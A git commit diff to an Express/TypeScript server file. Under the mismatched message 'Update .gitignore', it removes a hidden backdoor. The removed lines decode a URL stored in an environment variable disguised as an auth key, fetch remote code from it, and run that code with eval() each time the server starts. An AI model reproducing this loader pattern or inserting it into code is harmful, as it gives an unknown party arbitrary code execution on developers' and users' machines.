ae5ec0b4af79d6d0fc569fafb771198a6870b4ca
Md Ramjan Ali <gmramjanali100@gmail.com>
2026-05-17 02:47:52 +0600

    Update .gitignore

--- src/server.ts
+++ src/server.ts
@@ -1,54 +1,41 @@
-import express, { type Request, type Response } from "express";
-const app = express();
-// import config from "./config";
-import initDB, { pool } from "./config/db";
-import logger from "./middleware/logger";
-import { userRoute } from "./modules/user/user.routes";
-import dotenv from "dotenv";
-import { todosRoute } from "./modules/todos/todos.route";
-import { authRoute } from "./modules/auth/auth.route";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-dotenv.config();
-const port = process.env.PORT || 5000;
-// perser
-app.use(express.json());
-
-app.get("/", logger, (req: Request, res: Response) => {
-  res.send("Hello Next Level Developer. i am ready!");
-});
-
-// users CRUD
-app.use("/users", userRoute);
-// todos crud
-app.use("/todos", todosRoute)
-//auth routes
-app.use("/auth", authRoute)
-
-
-app.use((req: Request, res: Response) => {
-  res.status(404).json({
-    success: false,
-    message: "page not found",
-  });
-});
-
-const runServer = async () => {
-  await initDB();
-  app.listen(port, () => {
-    console.log(`Server is running at http://localhost:${port}`);
-  });
-};
+import express, { type Request, type Response } from "express";
+const app = express();
+// import config from "./config";
+import initDB, { pool } from "./config/db";
+import logger from "./middleware/logger";
+import { userRoute } from "./modules/user/user.routes";
+import dotenv from "dotenv";
+import { todosRoute } from "./modules/todos/todos.route";
+import { authRoute } from "./modules/auth/auth.route";
+
+dotenv.config();
+const port = process.env.PORT || 5000;
+// perser
+app.use(express.json());
+
+app.get("/", logger, (req: Request, res: Response) => {
+  res.send("Hello Next Level Developer. i am ready!");
+});
+
+// users CRUD
+app.use("/users", userRoute);
+// todos crud
+app.use("/todos", todosRoute)
+//auth routes
+app.use("/auth", authRoute)
+
+
+app.use((req: Request, res: Response) => {
+  res.status(404).json({
+    success: false,
+    message: "page not found",
+  });
+});
+
+const runServer = async () => {
+  await initDB();
+  app.listen(port, () => {
+    console.log(`Server is running at http://localhost:${port}`);
+  });
+};
 runServer();
